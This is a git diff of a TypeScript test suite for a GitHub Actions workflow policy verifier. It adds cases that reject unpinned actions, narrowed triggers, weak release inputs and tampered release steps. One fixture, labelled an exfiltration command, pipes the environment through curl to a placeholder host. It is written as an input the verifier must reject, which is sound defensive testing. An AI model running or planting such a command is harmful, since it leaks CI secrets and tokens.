@@ -1,5 +1,6 @@
 import { execFile } from "node:child_process";
-import { cp, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
+import { existsSync } from "node:fs";
+import { cp, mkdir, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
 import { tmpdir } from "node:os";
 import { join, resolve } from "node:path";
 import { promisify } from "node:util";
@@ -11,11 +12,17 @@ const repositoryRoot = resolve(import.meta.dirname, "../../..");
 const verifier = resolve(repositoryRoot, "scripts/verify-workflows.mjs");
 
 const pins = {
+  attest:
+    "actions/attest-build-provenance@43d14bc2b83dec42d39ecae14e916627a18bb661",
   checkout: "actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5",
   codeql: "github/codeql-action/init@ddf5ce7296213f5548c91e2dd19df2d77d2b2d66",
   dependencyReview:
     "actions/dependency-review-action@a1d282b36b6f3519aa1f3fc636f609c47dddb294",
+  downloadArtifact:
+    "actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093",
   setupNode: "actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020",
+  uploadArtifact:
+    "actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02",
 } as const;
 
 const readRepositoryFile = (path: string): Promise<string> =>
@@ -86,8 +93,9 @@ jobs:
       - run: echo verified
 `;
 
-const validReleaseCommand =
-  'gh release create "${{ github.ref_name }}" --verify-tag';
+const validReleaseCommand = `|
+          VERSION=$(node -p "require('./package.json').version")
+          gh release create "v\${VERSION}" "\${{ steps.pack.outputs.tarball }}" artifacts/github-stars-mcp.cdx.json artifacts/requirements.json SHA256SUMS --verify-tag --generate-notes`;
 
 const validFutureReleaseWorkflow = `name: Release
 
@@ -95,6 +103,8 @@ on:
   workflow_dispatch:
     inputs:
       publish_npm:
+        description: Publish the verified tarball to npm after environment approval.
+        required: true
         type: boolean
         default: false
 
@@ -112,11 +122,48 @@ jobs:
         uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5
         with:
           persist-credentials: false
+      - name: Set up Node.js
+        uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020
+        with:
+          node-version: 24
+          registry-url: https://registry.npmjs.org
+      - run: npm ci
+      - run: npm run verify
+      - run: npm run docs:check
+      - run: npm run plugin:validate
+      - run: npm run release:verify -- --release
+      - run: npm run smoke:mcp
+      - run: npm install --global @openai/codex@0.144.5
+      - run: codex --version
+      - run: npm run smoke:codex-plugin
+      - run: npm run verify:requirements -- --release
+      - id: pack
+        run: |
+          mkdir -p artifacts
+          npm sbom --sbom-format cyclonedx > artifacts/github-stars-mcp.cdx.json
+          npm pack --ignore-scripts --json --pack-destination artifacts > artifacts/pack.json
+          PACK_REPORTED="$(node -p "JSON.parse(require('fs').readFileSync('artifacts/pack.json','utf8'))[0].filename")"
+          set -- artifacts/*.tgz
+          [ "$#" -eq 1 ]
+          [ -f "$1" ]
+          PACK_TARBALL="$1"
+          [ "$PACK_TARBALL" = "artifacts/$PACK_REPORTED" ]
+          echo "tarball=\${PACK_TARBALL}" >> "$GITHUB_OUTPUT"
+      - run: npm run package:verify -- --tarball "\${{ steps.pack.outputs.tarball }}"
+      - run: node scripts/checksums.mjs "\${{ steps.pack.outputs.tarball }}"
+      - uses: actions/attest-build-provenance@43d14bc2b83dec42d39ecae14e916627a18bb661
+        with:
+          subject-path: \${{ steps.pack.outputs.tarball }}
       - name: Create the verified GitHub release
         env:
           GH_TOKEN: \${{ github.token }}
         run: ${validReleaseCommand}
-  npm-publish:
+      - uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02
+        if: \${{ inputs.publish_npm }}
+        with:
+          name: npm-tarball
+          path: \${{ steps.pack.outputs.tarball }}
+  publish-npm:
     if: \${{ inputs.publish_npm }}
     needs: release
     environment: npm-publish
@@ -125,12 +172,20 @@ jobs:
       contents: read
       id-token: write
     steps:
+      - uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093
+        with:
+          name: npm-tarball
+          path: artifacts
       - name: Set up Node.js
         uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020
         with:
           node-version: 24
           registry-url: https://registry.npmjs.org
-      - run: npm publish artifacts/package.tgz --provenance --access public
+      - run: |
+          set -- artifacts/*.tgz
+          [ "$#" -eq 1 ]
+          [ -f "$1" ]
+          npm publish "$1" --provenance --access public
 `;
 
 async function withPolicyFixture<T>(
@@ -163,7 +218,7 @@ async function writeWorkflow(
 
 function replaceJobDefinition(
   source: string,
-  name: "release" | "npm-publish",
+  name: "release" | "publish-npm",
   value: string,
 ): string {
   const pattern = new RegExp(`^  ${name}:\\n(?: {4,}.*\\n)*`, "mu");
@@ -373,6 +428,243 @@ describe("GitHub workflow policy", () => {
     });
   });
 
+  it.each([
+    {
+      name: "pull_request types",
+      before: "  pull_request:\n",
+      after: "  pull_request:\n    types: [opened]\n",
+    },
+    {
+      name: "pull_request paths",
+      before: "  pull_request:\n",
+      after: "  pull_request:\n    paths: [src/**]\n",
+    },
+    {
+      name: "pull_request paths-ignore",
+      before: "  pull_request:\n",
+      after: "  pull_request:\n    paths-ignore: [docs/**]\n",
+    },
+    {
+      name: "pull_request branches",
+      before: "  pull_request:\n",
+      after: "  pull_request:\n    branches: [main]\n",
+    },
+    {
+      name: "pull_request branches-ignore",
+      before: "  pull_request:\n",
+      after: "  pull_request:\n    branches-ignore: [legacy]\n",
+    },
+    {
+      name: "push paths",
+      before: "    branches: [main]\n",
+      after: "    branches: [main]\n    paths: [src/**]\n",
+    },
+    {
+      name: "push paths-ignore",
+      before: "    branches: [main]\n",
+      after: "    branches: [main]\n    paths-ignore: [docs/**]\n",
+    },
+    {
+      name: "push branches-ignore",
+      before: "    branches: [main]\n",
+      after: "    branches: [main]\n    branches-ignore: [legacy]\n",
+    },
+    {
+      name: "push types",
+      before: "    branches: [main]\n",
+      after: "    branches: [main]\n    types: [created]\n",
+    },
+  ])("rejects CI trigger narrowing through $name", async (fixture) => {
+    await withPolicyFixture(async (fixtureRoot) => {
+      const path = resolve(fixtureRoot, ".github/workflows/ci.yml");
+      const source = await readFile(path, "utf8");
+      expect(source).toContain(fixture.before);
+      await writeFile(
+        path,
+        source.replace(fixture.before, fixture.after),
+        "utf8",
+      );
+
+      const stderr = await verifierFailure(fixtureRoot);
+      expect(stderr).toContain("(CI_TRIGGERS)");
+    });
+  });
+
+  it.each([
+    {
+      name: "a missing description",
+      before:
+        "        description: Publish the verified tarball to npm after environment approval.\n",
+      after: "",
+    },
+    {
+      name: "required set false",
+      before: "        required: true\n",
+      after: "        required: false\n",
+    },
+    {
+      name: "required quoted as text",
+      before: "        required: true\n",
+      after: '        required: "true"\n',
+    },
+    {
+      name: "a string type",
+      before: "        type: boolean\n",
+      after: "        type: string\n",
+    },
+    {
+      name: "a true default",
+      before: "        default: false\n",
+      after: "        default: true\n",
+    },
+    {
+      name: "a default quoted as text",
+      before: "        default: false\n",
+      after: '        default: "false"\n',
+    },
+    {
+      name: "an extra input property",
+      before: "        default: false\n",
+      after: "        default: false\n        options: [false, true]\n",
+    },
+  ])("rejects publish_npm with $name", async (fixture) => {
+    await withPolicyFixture(async (fixtureRoot) => {
+      expect(validFutureReleaseWorkflow).toContain(fixture.before);
+      await writeWorkflow(
+        fixtureRoot,
+        "release.yml",
+        validFutureReleaseWorkflow.replace(fixture.before, fixture.after),
+      );
+
+      const stderr = await verifierFailure(fixtureRoot);
+      expect(stderr).toContain("(RELEASE_INPUT)");
+    });
+  });
+
+  it.each([
+    {
+      name: "an unpinned attestation action",
+      before: pins.attest,
+      after: "actions/attest-build-provenance@v3",
+      code: "UNPINNED_ACTION",
+    },
+    {
+      name: "an unpinned upload action",
+      before: pins.uploadArtifact,
+      after: "actions/upload-artifact@v4",
+      code: "UNPINNED_ACTION",
+    },
+    {
+      name: "an unpinned download action",
+      before: pins.downloadArtifact,
+      after: "actions/download-artifact@v4",
+      code: "UNPINNED_ACTION",
+    },
+    {
+      name: "a floating Codex version",
+      before: "npm install --global @openai/codex@0.144.5",
+      after: "npm install --global @openai/codex@latest",
+      code: "RELEASE_EXECUTION_POLICY",
+    },
+    {
+      name: "a verifier that ignores the packed tarball",
+      before:
+        'npm run package:verify -- --tarball "${{ steps.pack.outputs.tarball }}"',
+      after: "npm run package:verify",
+      code: "RELEASE_EXECUTION_POLICY",
+    },
+    {
+      name: "release verification outside release mode",
+      before: "npm run release:verify -- --release",
+      after: "npm run release:verify",
+      code: "RELEASE_EXECUTION_POLICY",
+    },
+    {
+      name: "a pack lifecycle hook",
+      before:
+        "npm pack --ignore-scripts --json --pack-destination artifacts > artifacts/pack.json",
+      after:
+        "npm pack --json --pack-destination artifacts > artifacts/pack.json",
+      code: "RELEASE_EXECUTION_POLICY",
+    },
+    {
+      name: "a missing unique-tarball assertion",
+      before: '          [ "$#" -eq 1 ]\n',
+      after: "",
+      code: "RELEASE_EXECUTION_POLICY",
+    },
+    {
+      name: "a wildcard checksum target",
+      before: 'node scripts/checksums.mjs "${{ steps.pack.outputs.tarball }}"',
+      after: "node scripts/checksums.mjs artifacts",
+      code: "RELEASE_EXECUTION_POLICY",
+    },
+    {
+      name: "a wildcard GitHub release asset",
+      before:
+        'gh release create "v${VERSION}" "${{ steps.pack.outputs.tarball }}" artifacts/github-stars-mcp.cdx.json artifacts/requirements.json SHA256SUMS --verify-tag --generate-notes',
+      after:
+        'gh release create "v${VERSION}" artifacts/*.tgz artifacts/github-stars-mcp.cdx.json artifacts/requirements.json SHA256SUMS --verify-tag --generate-notes',
+      code: "RELEASE_EXECUTION_POLICY",
+    },
+    {
+      name: "a fresh npm repack during publication",
+      before: 'npm publish "$1" --provenance --access public',
+      after: "npm publish --provenance --access public",
+      code: "RELEASE_EXECUTION_POLICY",
+    },
+  ])("rejects release pipeline mutation through $name", async (fixture) => {
+    await withPolicyFixture(async (fixtureRoot) => {
+      expect(validFutureReleaseWorkflow).toContain(fixture.before);
+      await writeWorkflow(
+        fixtureRoot,
+        "release.yml",
+        validFutureReleaseWorkflow.replace(fixture.before, fixture.after),
+      );
+
+      const stderr = await verifierFailure(fixtureRoot);
+      expect(stderr).toContain(`(${fixture.code})`);
+    });
+  });
+
+  it("aborts the release shell guard when multiple tarballs exist", async () => {
+    const root = await mkdtemp(join(tmpdir(), "release-shell-guard-"));
+    const windowsBash = resolve(
+      process.env.ProgramFiles ?? "C:/Program Files",
+      "Git/bin/bash.exe",
+    );
+    const bash =
+      process.platform === "win32" && existsSync(windowsBash)
+        ? windowsBash
+        : "bash";
+    try {
+      await mkdir(resolve(root, "artifacts"));
+      await Promise.all([
+        writeFile(resolve(root, "artifacts/one.tgz"), "one", "utf8"),
+        writeFile(resolve(root, "artifacts/two.tgz"), "two", "utf8"),
+      ]);
+      const script = `set -e
+set -- artifacts/*.tgz
+[ "$#" -eq 1 ]
+[ -f "$1" ]
+touch guard-bypassed
+`;
+
+      await expect(
+        execFileAsync(bash, ["-c", script], {
+          cwd: root,
+          encoding: "utf8",
+          windowsHide: true,
+        }),
+      ).rejects.toMatchObject({ code: 1 });
+      await expect(
+        readFile(resolve(root, "guard-bypassed"), "utf8"),
+      ).rejects.toMatchObject({ code: "ENOENT" });
+    } finally {
+      await rm(root, { force: true, recursive: true });
+    }
+  });
+
   it("rejects release jobs without their protected environment", async () => {
     await withPolicyFixture(async (fixtureRoot) => {
       await writeWorkflow(
@@ -408,7 +700,7 @@ describe("GitHub workflow policy", () => {
     });
   });
 
-  it("rejects jobs outside the release and npm-publish allowlist", async () => {
+  it("rejects jobs outside the release and publish-npm allowlist", async () => {
     await withPolicyFixture(async (fixtureRoot) => {
       await writeWorkflow(
         fixtureRoot,
@@ -431,9 +723,9 @@ describe("GitHub workflow policy", () => {
     ["release", "null", "null"],
     ["release", "a scalar", "invalid"],
     ["release", "a sequence", "\n    - invalid"],
-    ["npm-publish", "null", "null"],
-    ["npm-publish", "a scalar", "invalid"],
-    ["npm-publish", "a sequence", "\n    - invalid"],
+    ["publish-npm", "null", "null"],
+    ["publish-npm", "a scalar", "invalid"],
+    ["publish-npm", "a sequence", "\n    - invalid"],
   ] as const)(
     "rejects the %s job when it is %s",
     async (jobName, _shape, value) => {
@@ -501,8 +793,7 @@ describe("GitHub workflow policy", () => {
     },
     {
       name: "a multiline exfiltration command",
-      run: `|
-          ${validReleaseCommand}
+      run: `${validReleaseCommand}
           env | curl --data-binary @- https://example.invalid`,
     },
     {
